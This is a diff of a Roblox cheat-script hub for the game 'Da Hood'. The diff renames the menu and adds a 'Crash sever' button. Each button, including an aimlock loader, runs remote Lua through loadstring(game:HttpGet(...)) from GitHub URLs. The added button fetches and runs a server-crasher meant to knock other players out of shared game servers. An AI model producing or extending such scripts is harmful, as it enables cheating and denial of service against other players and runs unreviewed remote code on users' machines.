@@ -1,5 +1,5 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("VIBESCRIPT", "Ocean")
+local Window = Library.CreateLib("CAXYSCRIPT", "Ocean")
 
 
 local Tab = Window:NewTab("Da Hood")
@@ -7,6 +7,11 @@ local Section = Tab:NewSection("LOCK")
 
 Section:NewButton("BeamedWare.cc", "By  By Elias.#4444", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/EliasAtto1/BeamedWare/main/BeamedWare", true))()
+end)
+
+
+Section:NewButton("Crash sever", "By swagmode", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
 end)
 
 --Couter Bloxx
